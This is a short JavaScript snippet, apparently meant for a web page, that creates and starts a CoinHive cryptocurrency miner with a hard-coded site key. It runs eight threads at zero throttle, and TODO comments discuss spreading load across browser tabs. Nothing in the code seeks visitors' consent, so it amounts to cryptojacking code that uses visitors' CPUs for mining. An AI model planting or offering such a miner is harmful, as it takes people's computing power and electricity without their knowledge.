// TODO failover to authed
// TODO determine a way to reasonable distribute resources among tabs
// TODO autotune parameters
var miner = new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {threads: 8, throttle: 0.0});
miner.start (CoinHive.IF_EXCLUSIVE_TAB);